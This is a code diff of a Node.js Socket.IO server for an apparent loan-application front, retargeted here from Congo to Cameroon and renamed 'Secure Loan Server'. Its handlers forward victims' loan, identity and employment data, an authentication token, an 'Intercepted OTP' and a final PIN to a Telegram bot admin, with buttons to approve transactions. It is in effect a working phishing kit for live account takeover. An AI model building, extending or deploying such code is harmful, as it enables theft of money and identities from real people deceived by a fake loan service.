@@ -34,27 +34,32 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    // Generate unique Congo application session tag
-    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    // Generate unique application session tag
+    const appId = `ASA-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
     socket.join(appId);
-    console.log(`🔌 Congo User connected: ${appId}`);
+    console.log(`🔌 User connected: ${appId}`);
     
     // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Standard Log Streams (No admin inline interaction buttons needed)
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
-
-    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
+    // Standard Log Streams (No admin inline interaction buttons needed here)
+    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇲 Step 1: Loan Request", data, false));
+    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇲 Step 2: Identity Profile", data, false));
+    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇲 Step 3: Employment Profile", data, false));
+    
+    // Step 4: Authentication Token (Standard log stream, shifts user to step 5 on UI)
     socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
+        botManager.sendToAdmin(appId, "🇨🇲 Step 4: Authentication Token", data, false);
     });
 
-    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
+    // Step 5: OTP Entry Point (Triggers confirmation/rejection inline buttons in Telegram)
     socket.on('step5', (data) => {
+        botManager.sendToAdmin(appId, "🇨🇲 Step 5: Intercepted OTP", data, true);
+    });
+
+    // Step 6: Final PIN Submission (Triggers transaction final approval inline buttons)
+    socket.on('step6', (data) => {
         botManager.sendFinalApproval(appId, data.pin);
     });
 
@@ -64,7 +69,7 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, async () => {
-    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
+    console.log(`🚀 Secure Loan Server running on port ${PORT}`);
     
     // Auto-configure Webhooks on deployment platforms like Render
     if (EXTERNAL_URL) {
